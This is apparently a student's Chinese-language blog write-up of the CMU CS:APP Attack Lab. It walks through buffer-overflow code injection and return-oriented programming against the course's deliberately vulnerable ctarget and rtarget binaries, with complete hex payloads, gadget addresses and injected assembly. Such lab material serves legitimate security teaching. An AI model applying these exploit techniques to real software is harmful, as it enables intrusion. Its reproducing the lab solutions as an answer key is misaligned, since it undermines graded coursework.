---
title: attack-lab
description: 一个一开始完全不知道怎么做的实验
tags: [CMU]
date: 2022-04-06
lastmod: 2024-12-10
draft: false
---

> 前置条件：阅读完第三章

# 实验准备

在官网下载 `handout`并解压到本地文件夹，==仔细阅读== `Writeup`文档，文档中详细介绍了实验的做法，需要用到的东西等内容。

于是运行命令：

```shell
objdump ctarget > ctarget.s
objdump rtarget > rtarget.s
```

由文档知，`ctarget` 为第一个任务，`rtarget` 为第二个任务，其中 `farm.c` 是 `rtarget` 才需要用到的，`hex2raw` 是一个可执行文件，能将十六进制数转为二进制。

新建一个文本文件，命名为 `ans.txt` ，我们可以通过命令：

```shell
cat ans.txt | ./hex2raw | ./ctarget -q
```

来得到运行结果。若没有参数 `-q` 则会出现 `Error`，因为你没有 `CSAPP` 的账号，不能发送到服务器上去……（你没资格啊，你没资格啊——）

# 实验过程

## ctarget

```c
void test(){
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}

unsigned getbuf() {
    char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```

我们所需要做的，就是在调用 `getbuf` 函数返回时，不返回到 `test` 函数，而返回到 `touch_`函数。

并且需要使用的攻击方式是注入代码 / 字节，使缓冲区溢出。

### touch1

缓冲区溢出攻击

> 通过缓冲区溢出，修改返回的地址，使控制权发生更改到指定的位置

```c
void touch1(){
	vlevel = 1; /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}

```

`touch1` 很简单，我们可以阅读 `getbuf` 部分的汇编可以发现：

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

`getbuf` 分配了 $40$ 个字节的栈帧（在 `sub $0x28, %rsp` 中得出）。于是，为了返回时跳转到 `touch1` 函数，我们只需要先填满 `getbuf` 的栈帧，然后将返回处的地址改为 `touch1` 的地址。我们可以从 `touch1` 的汇编得到其地址：

```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

也就是 `0x4017c0`。于是答案为：

```asm
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

注意地址需要用小端法书写（在第二章中有提到 x86-64 的机器都是用小端法）

### touch2

```c
void touch2(unsigned val) {
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

这里的 `cookie` 在解压出的文件 `cookie.txt` 已经给出，于是，我们需要的就是在调用 `touch2` 时，传入一个参数 `val` 使其与 `cookie` 相等。

我们将此数值传递给寄存器 `%rdi`，然后将返回地址修改为 `touch2` 的入口地址即可，但由于我们只能使用 `ret` 来转移控制权，因此我们需要兜个圈子来达到这一目的。

> 注意到，从 `stdin` 中得到的字符串，存储在函数 `getbuf` 中的 `%rsp` 所指向的内存中

所以我们可以：

1. 将移交命令写入缓冲区 `buf` 中
2. 将返回地址修改为 `%rsp` 的值

这样，在 `ret` 后，`pc` 所拿到的地址就是缓冲区的地址，就可以执行我们实现写入的指令了。

指令可以写为：

```asm
movq $0x59b997fa, %rdi
push $0x4017ec
retq
```

注意到这里，我们使用 `push` 与 `ret` 来完成控制移交，这里的 `push` 其实等价于：

```asm
subl $4, %rsp
movq $0x4017ec, (%rsp)
```

而 `ret` 等价于：

```asm
movq (%rsp), %rip
addl $4, %rsp
```

这样，我们通过 `gcc -c func.s` 与 `objdump -d func.o` 后，可以得到指令序列：

`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3` 显然不够 $40$ 字节，剩下的按 0 补即可。

第二步，我们需要将 `getbuf` 函数的返回地址更改为 `%rsp` 的值也就是栈顶，通过 `gdb` 我们可以得到：

![image.png](https://virgil-civil-1311056353.cos.ap-shanghai.myqcloud.com/img/20231002173727.png)

其值为 `0x5561dc78`

于是，我们可以写出指令序列为：

```asm
48 c7 c7 fa 97 b9 59 68 ec 17
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55
```

### touch3

与 `touch2` 的任务类似，但我们需要传入的是 `cookie` 的字符串形式，而非一个立即数，因此，我们需要查询 `0x59b997fa` 的 `ascii` 形式怎么表示（不需要 `0x` ）

其字符串表示为 ： `35 39 62 39 39 37 66 61 00` （注意，我们需要在末尾加上 `'\0'`

我们可以轻松写出如下汇编：

```asm
HELLO_WORLD = "59b997fa"

movq HELLO_WORLD, %rdi
push $0x4018fa
ret

```

需要解决的问题实际上只有一个，`HELLO_WORLD` 到底应该存在什么位置（也就是指针应该是多少）

考虑 `touch2` ，我们显然可以把这个指针设置成 `%rsp` 的偏移量，由于我们知道 `%rsp` 的值，那么就很轻松能够算出来这个指针了。于是，我们的机器码如下：

```asm
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00
```

注意这里的 `0x5561dca8` 就是字符串的指针，计算方式为 `%rsp + 0x30` (由于`buf` 占据 $40$ 个字节， 而返回地址占 $8$ 字节，占 $8$ 字节的原因是需要对齐，因此总共占据 $48$ 字节)

## rtarget

### touch2

显然，我们需要找到 `cookie` 存放的位置，并将其移动到 `%rdi` 之中，然后调用 `ret` 来跳转到 `touch2` 的位置，我们可以将 `cookie` 的值置于栈顶，然后通过 `pop` 指令弹出到一个寄存器中（如果可以直接弹出到 `%rdi` 的话就完美了，否则我们还需要一次 `mov` 指令）

查表可以发现，无法在 `farm` 中找到 `5f`，但可以找到 `58`（也只有 `58`），于是，我们可以找到如下指令：

```asm
popq %rax
retq
movq %rax, %rdi
retq
```

即

```asm
58
c3
48 89 c7
c3
```

分别位于：`0x4019ab` 与 `0x4019a2`

> 注意，我们不能选择 `0x4019b0` 位置的那个序列，因为我们需要保证执行完这个指令后，下一条指令一定是 `c3` (i.e. `retq`)，这样才能保证我们的控制链是连贯的

于是，我们根据之前的计划，安排好次序：

```asm
ab 19 40
fa 97 b9 59  # <cookie value>
a2 19 40
```

由于我们最后一次需要跳转到 `touch2`，并且需要填充 `buf` 的 $40$ 字节，于是，完整的代码为：

```asm
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

### touch3

> 文档已经开始劝退了 :joy:
> ![image.png](https://virgil-civil-1311056353.cos.ap-shanghai.myqcloud.com/img/20231002201601.png)

难点主要在于如何传递这个字符串指针，在前面我们知道，字符串的指针是通过 `%rsp` 算出来的，但由于这里我们没办法知道 `%rsp` 的绝对值，所以我们必须读取 `%rsp` 的值，并对其做偏移

1. `movq %rsp, %rax`，机器码为 `48 89 e0 c3`
2. `add $offset, %rax`
3. `movq %rax, %rdi`，机器码为 `48 89 c7 c3`

此时，这个 `offset` 我们只能在给我们的代码中寻找，可以发现这个函数 `addval_190`，其汇编解释为：

![image.png](https://virgil-civil-1311056353.cos.ap-shanghai.myqcloud.com/img/20231002210443.png)

这里给予我们一些启发：如果这个 `0x37` 能够被加到 `%rax` 上就好了

通过一些探索，我们可以得到：

`add $0x37, %al` 的机器码就是 `04 37` （探索也很容易，就是不断缩小 `%rax` 的位数，反正只需要偏移 `0x37`，小一点也没关系）

那么，我们的字符串指针就需要在 `%rsp + 0x37` 的位置，也就是需要偏移 `55` 个字节，那么答案如下：

```asm
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
d8 19 40 00 00 00 00 00 # <- offset calculate at here
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00
35 39 62 39 39 37 66 61 00
```
